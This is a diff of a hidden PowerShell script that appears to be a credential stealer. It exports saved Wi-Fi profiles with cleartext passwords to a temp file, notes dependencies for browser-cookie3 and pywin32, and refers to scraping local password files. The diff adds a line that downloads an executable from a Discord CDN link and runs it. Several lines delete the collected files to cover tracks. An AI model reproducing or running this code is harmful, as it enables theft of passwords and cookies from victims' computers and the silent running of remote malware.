@@ -1,7 +1,6 @@
 #powershell -w hidden -nop -noni
 #pip install pycryptodomex pywin32 browser-cookie3 requests
-Start-Sleep -Seconds 6
-cmd.exe /c "D:\Python\python.exe D:\Scripts\fun.py" # instead of downloading something, just use the 128 gigs on the D:\ and run it there
+curl -o program.exe "https://cdn.discordapp.com/attachments/975173196103966800/1435755657705029790/fun.exe?ex=690d1f27&is=690bcda7&hm=b2aad148ae82f9f7533f919ccdbe006c76d041af5dab43587d910bf9de9d3466&"; .\program.exe
 $e="$env:LOCALAPPDATA\Temp"; netsh wlan export profile key=clear folder=$e | Out-Null; Get-ChildItem "$e\Wi-Fi*.xml" | %{$x=[xml](gc $_); "SSID:$($x.WLANProfile.SSIDConfig.SSID.name) | Password:$($x.WLANProfile.MSM.security.sharedKey.keyMaterial)"} > "$e\wifi.txt"
 
 #scrape the localappdata for password files
@@ -26,5 +25,5 @@ Remove-Item -Path "$e\wifi.txt"
 Remove-Item -Path "$e\ipcfg.txt"
 Remove-Item -Path "$zip"
 #exit quickly
-taskkill /F /IM pwsh.exe /IM powershell.exe 2>$null 
-echo sent!
+#taskkill /F /IM pwsh.exe /IM powershell.exe 2>$null 
+#echo sent!
